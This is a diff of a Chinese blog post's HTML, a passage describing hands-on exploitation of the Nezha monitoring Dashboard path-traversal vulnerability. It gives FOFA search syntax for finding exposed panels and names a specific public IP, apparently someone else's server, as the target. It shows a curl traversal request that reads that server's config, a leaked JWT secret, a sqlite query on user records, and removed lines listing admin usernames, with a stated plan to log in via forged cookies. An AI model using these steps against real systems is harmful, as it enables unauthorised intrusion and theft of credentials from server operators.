@@ -252,7 +252,7 @@
 <meta name="description" content="📌 写在前面 哪吒监控官方发布了一则重磅安全公告（GHSA-5c25-7vpj-9mqh），披露了一个无需任何认证即可读取任意文件的高危路径遍历漏洞。作为运维监控领域的常用工具，其影响面不容小觑。 本着&amp;quot;知己知彼&amp;quot;的安全理念，我决定对该漏洞进行完整的分析与验证。本文将完整记录从漏洞原理分析到实战验证的全过程，希望能为运维同仁提供防御参考。 一、漏洞全景概览 #&amp;hellip;">
 <meta name="keywords" content="玄外之音,Hyun,Hyun's Sound,Web Development,IDC,Server,Cloudflare,Minimalism,Digital Garden,SiYuan Note,网络安全,逆向工程,技术随笔">
 <link rel="canonical" href="https://blog.hyun.cc/post/49ZHl5/">
-<script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"哪吒监控Dashboard路径漏洞实战测试","url":"https://blog.hyun.cc/post/49ZHl5/","description":"📌 写在前面 哪吒监控官方发布了一则重磅安全公告（GHSA-5c25-7vpj-9mqh），披露了一个无需任何认证即可读取任意文件的高危路径遍历漏洞。作为运维监控领域的常用工具，其影响面不容小觑。 本着\u0026quot;知己知彼\u0026quot;的安全理念，我决定对该漏洞进行完整的分析与验证。本文将完整记录从漏洞原理分析到实战验证的全过程，希望能为运维同仁提供防御参考。 一、漏洞全景概览 #\u0026hellip;","datePublished":"2026-06-17T17:44:58+08:00","dateModified":"2026-06-17T17:44:58+08:00","author":{"@type":"Person","name":"玄外之音"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"/images/avatar.png"},"name":"玄外之音"}}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"哪吒监控Dashboard路径漏洞实战测试","url":"https://blog.hyun.cc/post/49ZHl5/","description":"📌 写在前面 哪吒监控官方发布了一则重磅安全公告（GHSA-5c25-7vpj-9mqh），披露了一个无需任何认证即可读取任意文件的高危路径遍历漏洞。作为运维监控领域的常用工具，其影响面不容小觑。 本着\u0026quot;知己知彼\u0026quot;的安全理念，我决定对该漏洞进行完整的分析与验证。本文将完整记录从漏洞原理分析到实战验证的全过程，希望能为运维同仁提供防御参考。 一、漏洞全景概览 #\u0026hellip;","datePublished":"2026-06-17T17:44:58+08:00","dateModified":"2026-06-17T18:41:17+08:00","author":{"@type":"Person","name":"玄外之音"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"/images/avatar.png"},"name":"玄外之音"}}</script>
 <script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","item":"https://blog.hyun.cc","name":"玄外之音","position":1},{"@type":"ListItem","item":"https://blog.hyun.cc/post/49ZHl5/","name":"哪吒监控Dashboard路径漏洞实战测试","position":2}]}</script>
 <meta property="og:title" content="哪吒监控Dashboard路径漏洞实战测试">
 <meta property="og:description" content="📌 写在前面 哪吒监控官方发布了一则重磅安全公告（GHSA-5c25-7vpj-9mqh），披露了一个无需任何认证即可读取任意文件的高危路径遍历漏洞。作为运维监控领域的常用工具，其影响面不容小觑。 本着&amp;quot;知己知彼&amp;quot;的安全理念，我决定对该漏洞进行完整的分析与验证。本文将完整记录从漏洞原理分析到实战验证的全过程，希望能为运维同仁提供防御参考。 一、漏洞全景概览 #&amp;hellip;">
@@ -501,10 +501,9 @@ func fallbackToFrontend(frontendDist fs.FS) func(*gin.Context) {
 <h2 id="heading-1">三、实战测试</h2>
 <h3 id="31-">3.1 信息侦查</h3>
 <p><strong>资产发现</strong>：</p>
-<p>使用FOFA搜索引擎定位暴露在公网的哪吒面板：</p>
-<pre><code>FOFA语法: title=&quot;哪吒监控&quot; &amp;&amp; port=&quot;8008&quot;
-</code></pre>
-<p>本次测试目标选定：<code>http://103.215.48.166:8008</code></p>
+<p>语法: title=&ldquo;Nezha&rdquo; &amp;&amp; port=&ldquo;8008&rdquo;</p>
+<p>扫到了了41631个面板，看了下大部分都更新最新版了，但是还是有很多头铁的。</p>
+<p>找了半天才找到了一个没鸡的面板：<code>http://103.215.48.166:8008</code></p>
 <h3 id="32-">3.2 漏洞验证</h3>
 <h4 id="heading-2">步骤一：探测路径遍历漏洞</h4>
 <pre><code class="language-bash">curl -v --path-as-is 'http://103.215.48.166:8008/dashboard../data/config.yaml'
@@ -529,102 +528,7 @@ jwt_secret_key: rxLGg4gNLJEhRKA0oBOKBoGCaoqkdNW2R8OhLXu2XOZqKsWZy0iF5u4WXBl9zfee
 <pre><code class="language-bash">sqlite3 sqlite.db &quot;SELECT id, username, role FROM users;&quot;
 </code></pre>
 <p><strong>令人震惊的结果</strong>：</p>
-<table>
-<thead>
-<tr>
-<th>ID</th>
-<th>用户名</th>
-<th>角色</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>1</td>
-<td><strong>admin</strong></td>
-<td>管理员</td>
-</tr>
-<tr>
-<td>2</td>
-<td>xiaofeng</td>
-<td>管理员</td>
-</tr>
-<tr>
-<td>3</td>
-<td>system</td>
-<td>管理员</td>
-</tr>
-<tr>
-<td>4</td>
-<td>adm_vffarbmb</td>
-<td>管理员</td>
-</tr>
-<tr>
-<td>5</td>
-<td>adm_dsesavvc</td>
-<td>管理员</td>
-</tr>
-<tr>
-<td>6</td>
-<td>adm_s/stwvkg</td>
-<td>管理员</td>
-</tr>
-<tr>
-<td>7</td>
-<td>adm_fr4dy7/x</td>
-<td>管理员</td>
-</tr>
-<tr>
-<td>8</td>
-<td>adm_qha+o3pg</td>
-<td>管理员</td>
-</tr>
-<tr>
-<td>9</td>
-<td>adm_2+lrtv3+</td>
-<td>管理员</td>
-</tr>
-<tr>
-<td>10</td>
-<td>adm_xxwiuzec</td>
-<td>管理员</td>
-</tr>
-<tr>
-<td>11</td>
-<td>adm_luqs0mhf</td>
-<td>管理员</td>
-</tr>
-<tr>
-<td>12</td>
-<td>adm_ambw/x5z</td>
-<td>管理员</td>
-</tr>
-<tr>
-<td>13</td>
-<td>adm_mqqd+h4+</td>
-<td>管理员</td>
-</tr>
-<tr>
-<td>14</td>
-<td>adm_ieu8o3ep</td>
-<td>管理员</td>
-</tr>
-<tr>
-<td>15</td>
-<td>adm_dwjr41v3</td>
-<td>管理员</td>
-</tr>
-<tr>
-<td>16</td>
-<td>adm_wyc7dear</td>
-<td>管理员</td>
-</tr>
-<tr>
-<td>17</td>
-<td>adm_2fr/p2fo</td>
-<td>管理员</td>
-</tr>
-</tbody>
-</table>
+<p><img src="https://tc.7zz.cn/i/2026/03/27/6d6a3ecf57ade8bebbf4a5c673ce04fa.png" alt="image" /></p>
 <p>⚠️ <strong>发现异常</strong>：</p>
 <ul>
 <li>默认 <code>admin</code> 账户<strong>仍然存在且未修改密码</strong>但是我们本次是测试利用Cookie实现登录，所以就当admin不存在。</li>
